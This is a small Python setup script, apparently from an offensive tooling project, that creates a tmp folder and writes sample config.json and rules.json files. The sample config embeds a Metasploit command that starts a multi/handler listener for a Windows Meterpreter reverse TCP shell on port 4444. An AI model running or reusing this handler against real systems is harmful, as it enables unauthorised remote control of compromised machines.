import os,sys
import json

def check_env():
	if os.path.exists('tmp') and os.path.isfile('config.json') and os.path.isfile('rules.json'):
		return True
	else:
		return False

def initialization():
	cprint('Initializing', 'info')
	try:
		os.mkdir('tmp')
		with open('config.json', 'w+') as f:
			f.write(config_content_sample)
		with open('rules.json', 'w+') as f:
			f.write(rules_content_sample)
		cprint('Initialized successfully', 'succ')
	except:
		cprint('Initialized failed', 'err')
		sys.exit()

def cprint(message,level):
    if level == 'err':
        print('[-] ' + message)
    elif level == 'info':
        print('[*] ' + message)
    elif level == 'succ':
        print('[+] ' + message)
    else:
        raise Exception('LEVEL ERROR')

config_content_sample = '''{
	"listen_command": "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 0.0.0.0;set LPORT 4444;run;"
}

'''

rules_content_sample = '''{
"x86": {
	"test_rule": "S1"
	}
}
'''